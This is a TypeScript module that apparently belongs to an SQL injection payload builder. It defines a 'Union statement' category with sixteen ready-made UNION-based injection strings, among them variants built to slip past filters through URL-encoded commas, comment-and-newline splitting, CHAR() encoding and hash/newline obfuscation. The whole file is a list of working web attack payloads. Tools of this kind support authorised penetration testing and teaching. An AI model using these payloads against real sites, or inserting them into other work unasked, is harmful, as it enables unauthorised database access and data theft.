import { BuilderSubcategory } from '../../types';

export const unionSubcategory: BuilderSubcategory = {
  id: 'union',
  label: 'Union statement',
  description: 'UNION query structure and bypass syntax templates',
  templates: [
    {
      id: 'union-select-12345',
      name: 'Union Select 1,2,3,4,5',
      content: 'Union Select 1,2,3,4,5'
    },
    {
      id: 'union-plus-select-12345',
      name: 'UNION+SELECT+1,2,3,4,5',
      content: 'UNION+SELECT+1,2,3,4,5'
    },
    {
      id: 'union-plus-all-plus-select-12345',
      name: 'UNION+All+SELECT+1,2,3,4,5',
      content: 'UNION+All+SELECT+1,2,3,4,5'
    },
    {
      id: 'union-plus-all-plus-select-null',
      name: 'UNION+ALL+SELECT null,null,null',
      content: 'UNION+ALL+SELECT null,null,null'
    },
    {
      id: 'union-select-parens',
      name: 'UNION(SELECT(1),(2),(3),(4),(5))',
      content: 'UNION(SELECT(1),(2),(3),(4),(5))'
    },
    {
      id: 'union-distinctrow-select',
      name: 'Union Distinctrow Select 1,2,3,4,5',
      content: 'Union Distinctrow Select 1,2,3,4,5'
    },
    {
      id: 'union-select-13371',
      name: 'Union Select 13371,13372,13373',
      content: 'Union Select 13371,13372,13373'
    },
    {
      id: 'union-select-encoded-comma',
      name: 'Union Select 1%2c2%2c3%2c4%2c5',
      content: 'Union Select 1%2c2%2c3%2c4%2c5'
    },
    {
      id: 'union-select-comment-newline',
      name: 'Union Select 1--+%0A,2--+%0A,3--+%0A',
      content: 'Union Select 1--+%0A,2--+%0A,3--+%0A'
    },
    {
      id: 'union-select-tilde',
      name: 'Union Select ~1,~2,~3,~4,~5',
      content: 'Union Select ~1,~2,~3,~4,~5'
    },
    {
      id: 'union-select-dot',
      name: 'Union Select .1,.2,.3,.4,.5',
      content: 'Union Select .1,.2,.3,.4,.5'
    },
    {
      id: 'union-select-quotes',
      name: "Union Select '1','2','3','4','5'..",
      content: "Union Select '1','2','3','4','5'"
    },
    {
      id: 'union-select-quad-digits',
      name: 'Union Select 1111,2222,3333',
      content: 'Union Select 1111,2222,3333'
    },
    {
      id: 'union-select-char',
      name: 'Union Select CHAR(49),CHAR(50),CHAR(51)',
      content: 'Union Select CHAR(49),CHAR(50),CHAR(51)'
    },
    {
      id: 'join-select-alias',
      name: 'join(SELECT 1)a join(SELECT 2)b join(SELECT 3)c',
      content: 'join(SELECT 1)a join(SELECT 2)b join(SELECT 3)c'
    },
    {
      id: 'union-select-hash-newline-bypass',
      name: '%23%0AUnion%23aaaaaaaaaaaaaaaa%0ASelect%23%0A',
      content: '%23%0AUnion%23aaaaaaaaaaaaaaaa%0ASelect%23%0A'
    }
  ]
};
